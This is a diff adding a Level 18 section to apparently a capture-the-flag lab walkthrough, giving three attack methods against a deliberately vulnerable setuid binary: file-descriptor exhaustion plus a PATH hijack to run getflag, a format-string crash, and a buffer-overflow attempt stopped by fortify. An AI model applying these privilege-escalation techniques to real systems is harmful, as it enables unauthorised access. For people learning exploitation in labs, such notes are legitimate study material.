@@ -257,6 +257,44 @@ next level pass:
 
 Level 18
 ---------------------------
+(http://vnico.mundodisco.net/archives/36)
+Method 1:
+ulimit -a 
+[. . .]
+open files                      (-n) 1024
+$ for i in {0..1030}; do echo "login test" >> input; done
+$ echo "closelog" >> /tmp/input
+$ echo "shell" >> input
+$ echo "/bin/getflag" > /tmp/Starting
+$ chmod +x /tmp/Starting
+$ export PATH=/tmp:$PATH
+$ cat input |/home/flag18/flag18 -d deglog
+
+Method 2:
+level18.c: In function ânotsupportedâ:
+level18.c:46:2: warning: format not a string literal and no format arguments [-Wformat-security]
+
+(Reference to SITE EXEC format string vulnerability in WU-FTPD 2.6.0)
+[1] Hacking - The Art of Exploitation 2nd edition - Jon Erickson
+
+$ /home/flag18/flag18 -d deb -vvv
+site exec %s%s%s%s%s%s%s%s%s%s%s%s
+Segmentation fault
+
+Detailed steps in fmt_exploit_session.txt file.
+
+Method3
+Bypass fortify protection for buffer overflow at setuser command
+
+$ echo setuser `perl -e 'print "A"x200'` | /home/flag18/flag18
+*** buffer overflow detected ***: /home/flag18/flag18 terminated
+======= Backtrace: =========
+/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x45)[0x6ff8d5]
+   
+next level pass:
+
+Level 19
+---------------------------
 
 
 --------
